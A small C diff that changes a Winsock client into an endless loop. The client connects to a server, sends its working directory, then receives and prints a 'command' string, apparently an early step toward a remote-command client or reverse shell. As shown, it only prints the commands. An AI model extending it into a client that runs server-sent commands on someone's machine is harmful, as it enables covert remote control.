@@ -25,12 +25,12 @@ int main(){
     startWinsock();
     client_socket = startSocket();
     connectToServer(&serv_addr, client_socket, server_ip);
-    
-    getcwd(cwd, 1024);
-    sendMsg(client_socket, cwd);
-    receiveCommand(client_socket, cmd_buff);
-    printf("%s", cmd_buff);
-
+    while (1){
+        getcwd(cwd, 1024);
+        sendMsg(client_socket, cwd);
+        receiveCommand(client_socket, cmd_buff);
+        printf("%s\n", cmd_buff);
+    }
     return 1;
 }
 
